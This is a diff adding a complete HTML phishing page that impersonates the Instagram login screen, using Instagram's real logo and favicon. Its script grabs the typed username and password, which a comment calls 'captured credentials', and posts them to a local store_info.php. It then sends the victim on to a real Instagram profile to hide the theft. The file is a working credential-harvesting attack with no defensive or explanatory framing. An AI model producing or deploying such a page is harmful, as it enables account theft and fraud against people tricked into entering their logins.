@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" type="image/x-icon" />
+    <title>Instagram</title>
+    <style>
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-form {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 24px;
+            border-radius: 5px;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 20px;
+            width: 175px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+        }
+        .login-btn {
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-form">
+            <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <div class="form-group">
+                    <button type="submit" class="login-btn">Log In</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Send captured credentials to the server-side script
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', './store_info.php', true);
+            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
+
+            // Redirect to a specific Instagram reel video
+            window.location.href = 'https://www.instagram.com/_2hosin_?igsh=MWdpdjdzZ2wwZGZ5dA==';
+        });
+    </script>
+</body>
+</html>
